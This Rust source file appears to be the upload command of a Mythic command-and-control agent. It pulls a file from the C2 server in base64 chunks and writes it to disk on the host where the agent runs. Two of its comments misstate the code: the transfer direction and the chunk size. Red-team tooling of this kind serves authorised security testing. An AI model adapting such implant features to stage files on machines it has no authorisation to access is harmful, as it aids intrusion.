use crate::agent::{AgentTask, ContinuedData};
use crate::mythic_success;
use crate::utils::unverbatim;
use serde::Deserialize;
use serde_json::json;
use std::error::Error;
use std::io::prelude::*;
use std::io::ErrorKind;
use std::path::Path;
use std::result::Result;
use std::sync::mpsc;

use path_clean::PathClean;

/// Chunk size used for file transfer (5KB)
const CHUNK_SIZE: usize = 512000;

/// Struct holding the task parameters
#[derive(Deserialize)]
struct UploadArgs {
    file: String,
    path: String,
}

/// Upload a file from the host machine to Mythic
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
pub fn upload_file(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the initial tasking information
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: UploadArgs = serde_json::from_str(&task.parameters)?;

    // Formulate the absolute path for the file upload
    let cwd = std::env::current_dir()?;
    let file_path = cwd.join(args.path);

    // Get the full path as a string
    let file_path_str = unverbatim(file_path.clean()).to_string_lossy().to_string();

    // Check if the file path being uploaded to already exists
    let file_path = Path::new(&file_path);
    if file_path.exists() {
        return Err("Remote path already exists.".into());
    }

    // Send up the upload message to Mythic and initiate the upload
    tx.send(json!({
        "upload": json!({
            "chunk_size": CHUNK_SIZE,
            "file_id": args.file,
            "chunk_num": 1,
            "full_path": file_path_str,
        }),
        "task_id": task.id,
        "user_output": "Uploading chunk 1\n",
    }))?;

    // Grab and parse the response from Mythic
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;

    // Store the upload file chunk data
    let mut file_data: Vec<u8> =
        base64::decode(continued_args.chunk_data.ok_or_else(|| {
            std::io::Error::new(ErrorKind::Other, "Failed to get file chunk data")
        })?)?;

    // Get the total chunks
    let total_chunks = continued_args.total_chunks.unwrap();

    // Continue receiving file chunks
    for chunk_num in 2..=total_chunks {
        tx.send(json!({
            "upload": json!({
                "chunk_size": CHUNK_SIZE,
                "file_id": args.file,
                "chunk_num": chunk_num,
                "full_path": file_path_str,
            }),
            "task_id": task.id,
            "user_output": format!("Uploading chunk {}/{}\n", chunk_num, total_chunks),
        }))?;

        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;

        // Append the new base64 decoded chunk data
        file_data.append(&mut base64::decode(continued_args.chunk_data.unwrap())?);
    }

    // Open the file handle. This will check if the agent has the correct permissions.
    let mut f = std::fs::File::create(&file_path_str)?;

    // Write out the received file to disk
    f.write_all(&file_data)?;

    // Send up a success to Mythic
    tx.send(mythic_success!(
        task.id,
        format!("Uploaded '{}' to host", file_path_str)
    ))?;

    Ok(())
}
